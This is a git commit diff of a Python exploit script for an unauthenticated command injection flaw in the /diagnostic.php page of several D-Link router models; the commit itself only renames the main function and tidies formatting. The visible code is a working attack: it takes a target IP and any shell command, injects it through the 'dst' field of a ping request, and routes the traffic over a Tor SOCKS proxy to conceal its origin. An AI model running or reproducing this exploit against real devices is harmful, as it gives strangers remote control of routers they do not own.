d5c632d6c268aa6cf166badbb437c6d19cef4d51
Storm Van Soldt <stormvansoldt@yahoo.com>
2018-02-06 17:07:16 -0700

    changed main function name and formatting

--- RouterSploits/dlink_cmd_injection.py
+++ RouterSploits/dlink_cmd_injection.py
@@ -6,14 +6,13 @@ import urllib.request
 import socks
 from sockshandler import SocksiPyHandler
 
-
-def exploit():
+def main():
 	'''
 	This module exploits an unauthenticated command injection vulerability
 	in the D-LINK DIR-300/600/645/815 web interfaces at /diagnostic.php. This
 	vulnerability affects these routers on firmware versions < 1.03, however
-	it is also possible on firmware v1.03 with valid authentication. It has been
-	fixed on v1.04 and higher.
+	it is also possible on firmware v1.03 with valid credentials for the 
+	web interface
 	'''
 
 	REMOTE_HOST	= input('Enter host IP: ')
@@ -21,15 +20,12 @@ def exploit():
 	COMMAND 	= input('Enter the command you want to execute on the router: ')
 	url 		= 'http://%s:%s/diagnostic.php' %(REMOTE_HOST, REMOTE_PORT)
 	opener 		= urllib.request.build_opener(SocksiPyHandler(socks.SOCKS5, '127.0.0.1', 9050))
-	#opener = urllib.request.build_opener(urllib.request.ProxyHandler({'http': '127.0.0.1:8080'}))
-
 	header		= {
 		'Host': '%s:%s' %(REMOTE_HOST, REMOTE_PORT),
 		'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101',
 		'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
 		'Connection': 'Close'
 	}
-
 	post_args 	= ({
 		'act': 'ping',
 		'dst': '& %s&' %COMMAND
@@ -39,4 +35,5 @@ def exploit():
 	request 	= urllib.request.Request(url, enc_args, header)
 	response 	= opener.open(request).read()
 
-exploit()
+if __name__ == '__main__':
+	main()
